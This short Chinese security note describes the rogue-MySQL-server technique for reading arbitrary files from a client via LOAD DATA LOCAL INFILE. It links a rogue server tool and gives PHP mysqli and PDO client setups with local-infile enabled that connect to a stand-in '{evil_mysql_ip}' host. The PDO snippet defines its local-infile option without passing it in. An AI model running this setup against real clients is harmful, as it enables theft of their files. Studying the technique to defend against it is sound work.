# MySQL LOAD DATA 读取客户端任意文件

 https://github.com/Gifts/Rogue-MySql-Server 

要求:
allow_local_infile=true

## 客户端搭建

```php
<?php

$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, '{evil_mysql_ip}', 'root', '123456', 'test', 3667);
$p = mysqli_query($m, 'select 1;');
```



```php
$dbms='mysql';    
$host='ccreater.top';
$dbName='test';   
$user='root';
$pass='';  
$port='60011';
$dsn="$dbms:host=$host;dbname=$dbName;port=$port";

$options = [
    \PDO::MYSQL_ATTR_LOCAL_INFILE=>1
];
try {
    $dbh = new PDO($dsn, $user, $pass); 
    $dbh->query('SELECT 1');

} catch (PDOException $e) {
    die ("Error!: " . $e->getMessage() . "<br/>");
}
```

